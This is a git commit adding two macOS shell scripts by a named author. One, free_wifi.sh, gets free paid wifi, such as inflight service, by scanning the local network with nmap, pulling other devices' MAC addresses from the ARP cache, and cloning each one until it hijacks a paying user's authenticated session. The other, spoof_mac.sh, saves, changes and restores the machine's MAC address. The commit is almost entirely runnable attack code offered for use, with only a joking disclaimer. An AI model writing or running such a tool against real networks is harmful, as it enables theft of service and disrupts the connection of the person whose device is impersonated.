2984f7ecec41d25b0e6f1d0c8125be5d0dd26330
Arul Selvan <aselvan@selvans.net>
2019-05-04 11:43:29 -0500

    added free_wifi and spoof_mac scripts

---
+++ free_wifi.sh
@@ -0,0 +1,127 @@
+#/bin/sh
+#
+# free_wifi.sh
+#
+# Description: 
+# Get free wifi by spoofing an authenticated mac address on a paid wifi service like
+# inflight wifi. Obviously in order for this to work there needs to be at least one
+# device on the network that paid for the wifi service. The script attempts to find 
+# that device and uses the mac address of that device.
+# 
+# Disclaimer: 
+# This will obviously create lot of packet collitions/problems on the network and  
+# create slowness for you and the device you are spoofing, so just pay for the 
+# wifi service, don't be a free loader :) If you do choose to use this script, you 
+# are using at your own risk and I am not liable for any loss or damage you have 
+# caused by using this script.
+#
+# Author:  Arul Selvan
+# Version: Feb 4, 2017
+# OS: macOS
+# See also: spoof_mac.sh
+#
+
+# google dns for validating connectivity
+gdns=8.8.8.8
+my_mac_addr_file="$HOME/.my_mac_address"
+my_mac=""
+iface="en0"
+
+check_root() {
+  if [ `id -u` -ne 0 ] ; then
+    echo "[ERROR] you must be 'root' to run this script... exiting."
+    exit
+  fi
+}
+
+ping_check() {
+  /sbin/ping -t30 -c3 -qo $gdns >/dev/null 2>&1
+  return $?
+}
+
+restore_mac() {
+  echo "[INFO] restoring mac to $my_mac ..."
+  ifconfig $iface ether $my_mac
+  exit
+}
+
+save_mac() {
+  if [ ! -f $my_mac_addr_file ] ; then
+    echo "[WARN] no previously saved mac file ($my_mac_addr_file) found!"
+    echo "[WARN] saving current mac address as saved mac address"
+    my_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
+    echo $my_mac > $my_mac_addr_file
+  else
+    my_mac=`cat $my_mac_addr_file`
+    echo "[INFO] using saved mac address: $my_mac"
+  fi
+}
+
+usage() {
+  echo "Usage: $0 [interface]"
+  exit
+}
+
+check_mac() {
+  mac_addr=$1
+  ifconfig $iface ether $mac_addr
+  # take the interface down and up to ask for dhcp
+  echo "[INFO] taking iface down and up ..."
+  ifconfig $iface down
+  sleep 1
+  ifconfig $iface up
+  sleep 1
+  /bin/echo -n "[INFO] waiting for new IP assignment ."
+  count=10
+  for (( i = 0; i<$count; i++ )) do
+    sleep 1
+    /bin/echo -n .
+    ip=`ipconfig getifaddr $iface`
+    if [ ! -z $ip ] ; then
+      break
+    fi
+  done
+
+  echo ""
+  echo "[INFO] checking for connectivity ..."
+  ping_check
+  if [ $? -eq 0 ] ; then
+    echo "[INFO] got connectivity!"
+    exit
+  else
+    echo "[ERROR] connctivity failed for $mac_addr!"
+  fi
+  return
+}
+
+check_root
+
+if [ ! -z $1 ] ; then
+  iface=$1
+fi
+
+# save our mac address first
+save_mac
+
+# do a nmap to collect macaddress in arp cache
+echo "[INFO] collecting arp cache ..."
+my_net=`ipconfig getifaddr $iface|awk -F. '{print $1"."$2"."$3".0/24"; }'`
+echo "[INFO] scanning net $my_net"
+nmap --host-timeout 3 -T5 $my_net >/dev/null 2>&1
+
+# now get the list of macs and iterate through to find an 
+# authenticated mac (someone who paid for this crappy wifi)
+list_of_macs=`arp -an -i $iface|awk '{print $4;}'`
+
+for mac in $list_of_macs; do 
+  if [ $mac = "(incomplete)" ] ; then
+    continue
+  elif [ $mac = $my_mac ] ; then
+    continue
+  fi
+  echo "[INFO] checking: $mac ..."
+  check_mac $mac
+done
+
+# if we get here nothing is available, just restore and exit
+restore_mac
---
+++ spoof_mac.sh
@@ -0,0 +1,101 @@
+#/bin/sh
+#
+# spoof_mac.sh
+#
+# Description: 
+#  Spoof mac address, save current or restore.
+# 
+# Disclaimer: 
+# This will obviously create lot of packet collitions/problems on the network and  
+# create slowness, so you do choose to use this script, you are using at your own 
+# risk and I am not liable for any loss or damage you have caused by using this script.
+#
+# Author:  Arul Selvan
+# Version: Feb 4, 2017
+# OS: macOS
+#
+
+my_mac_addr_file="$HOME/.my_mac_address"
+iface="en0"
+options_list="i:m:lsrh"
+
+check_root() {
+  if [ `id -u` -ne 0 ] ; then
+    echo "[ERROR] you must be 'root' to run this script... exiting."
+    exit
+  fi
+}
+
+restore_mac() {
+  if [ ! -f $my_mac_addr_file ] ; then
+    echo "[ERROR] no previously saved mac file ($my_mac_addr_file) found!"
+    exit
+  fi
+  my_mac=`cat $my_mac_addr_file`
+  echo "[INFO] restoring mac to $my_mac on interface '$iface' ..."
+  ifconfig $iface ether $my_mac
+  exit
+}
+
+save_mac() {
+  echo "[INFO] saving my mac address ..."
+  my_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
+  echo $my_mac > $my_mac_addr_file
+  exit
+}
+
+spoof_mac() {
+  mac_to_spoof=$1
+  echo "[INFO] spoofing your mac as '$mac_to_spoof' on interface '$iface'"
+  ifconfig $iface ether $mac_to_spoof
+  exit
+}
+
+show_mac() {
+  my_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
+  echo "[INFO] your current mac address on interface $iface is: $my_mac"
+  exit
+}
+
+usage() {
+  echo "Usage: $0 [options]"
+  echo "  -i <interface> [default: en0 note: needs to be first argument to choose another interface]"
+  echo "  -m <mac_address_to_spoof> [changes your mac address to the one provided]"
+  echo "  -s [saves current mac address]"
+  echo "  -r [restores previously saved mac address]"
+  echo "  -l [shows the currently used mac address]"
+  exit
+}
+
+check_root
+
+while getopts "$options_list" opt; do
+  case $opt in
+    i)
+      iface=$OPTARG
+      ;;
+    m)
+      spoof_mac $OPTARG
+      ;;
+    s)
+      save_mac
+      ;;
+    r)
+      restore_mac
+      ;;
+    l)
+      show_mac
+      ;;
+    h)
+      usage
+      ;;
+    \?)
+     usage
+     ;;
+    :)
+     usage
+     ;;
+   esac
+done
+
+usage
